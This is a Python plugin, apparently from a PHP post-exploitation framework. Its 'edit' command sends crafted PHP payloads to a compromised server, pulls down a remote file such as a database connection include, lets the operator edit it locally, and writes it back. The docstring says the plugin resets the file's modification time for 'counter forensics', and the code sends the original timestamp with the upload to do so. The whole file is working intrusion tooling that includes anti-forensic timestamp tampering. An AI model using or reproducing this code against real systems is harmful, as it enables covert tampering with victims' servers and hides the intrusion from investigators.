"""Print a file content to standard output

SYNOPSIS:
    edit <REMOTE FILE>

DESCRIPTION:
    This command is an enhancement of the 'cat' plugin. Instead
    of simply writing the content to standard output, it opens
    the remote file content with your preferred text editor,
    which if defined by the EDITOR setting.
    - Once opened with the local text editor, the file can be
    edited. When leaving the text editor, the plugin checks if
    the content has changed, and automatically uploads the new
    file content to the remote server.
    - The plugin will automatically try to reset file modification
    time ot it previous value, for counter forensics purposes.

EXAMPLES:
    > edit ../includes/connect.inc.php
      - Open the file with the EDITOR

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import sys
import base64

from api import plugin
from api import server

from datatypes import Path

if len(plugin.argv) != 2:
    sys.exit(plugin.help)

absolute_path = server.path.abspath(plugin.argv[1])
path_filename = server.path.basename(absolute_path)

reader = server.payload.Payload("reader.php")
reader['FILE'] = absolute_path

# send the crafted payload to get remote file contents
reader_response = reader.send()

file = Path(filename=path_filename)

if reader_response == "NEW_FILE":
    file_mtime = None
    print("[*] Creating new file: %s" % absolute_path)
else:
    # writting bytes() obj to file in binary mode
    file_mtime, file_data = reader_response
    file.write(base64.b64decode(file_data), bin_mode=True)

modified = file.edit()
if not modified:
    if reader_response == "NEW_FILE":
        sys.exit("File creation aborted")
    else:
        sys.exit("The file was not modified")

writer = server.payload.Payload("writer.php")
writer['FILE'] = absolute_path
writer['DATA'] = base64.b64encode(file.read(bin_mode=True)).decode()
writer['MTIME'] = file_mtime

writer_response = writer.send()

if writer_response == "MTIME_FAILED":
    print("[-] %s: Could not set MTIME to %r" % (plugin.argv[0], file_mtime))

print("[*] File correctly written at %s" % absolute_path)
